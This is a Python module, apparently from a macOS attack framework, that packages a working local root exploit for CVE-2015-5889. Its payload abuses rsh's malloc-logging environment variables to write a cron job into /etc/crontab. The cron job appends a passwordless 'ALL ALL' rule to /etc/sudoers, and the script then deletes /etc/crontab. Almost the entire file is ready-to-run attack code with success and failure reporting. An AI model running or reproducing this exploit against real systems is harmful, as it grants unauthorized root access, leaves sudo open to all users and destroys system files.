class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Attempts to get root via CVE-2015-5889 (10.9.5 to 10.10.5).",
            "References": [
                "https://www.exploit-db.com/exploits/38371/",
                "https://www.rapid7.com/db/modules/exploit/osx/local/rsh_libmalloc"
            ]
        }

    def setup(self, module_view, output_view, successful):
        successful.put(True)

    def run(self):
        return """\
        import os
        import time
        
        env = {}
        old_size = os.stat("/etc/sudoers").st_size
        malloc_directory = "a\\n* * * * * root echo \\"ALL ALL=(ALL) NOPASSWD: ALL\\" >> /etc/sudoers\\n\\n\\n\\n\\n\"
        
        env["MallocLogFile"] = "/etc/crontab"
        env["MallocStackLogging"] = "yes"
        env["MallocStackLoggingDirectory"] = malloc_directory
        
        print "Creating /etc/crontab..."
        
        p = os.fork()
        if p == 0:
            os.close(1)
            os.close(2)
            os.execve("/usr/bin/rsh", ["rsh", "localhost"], env)
        
        time.sleep(1)
        
        if "NOPASSWD" not in open("/etc/crontab").read():
            print "FAILED!"
        else:
            print "Done, waiting for /etc/sudoers to update..."
            
            while os.stat("/etc/sudoers").st_size == old_size:
                time.sleep(1)
            
            print "Exploit completed."
            os.system("sudo rm -rf /etc/crontab")
        """

    def process_response(self, output_view, response):
        if "completed" in response:
            output_view.add("Exploit completed successfully, you can now run sudo commands.", "info")
        else:
            output_view.add("Failed to execute exploit.", "attention")
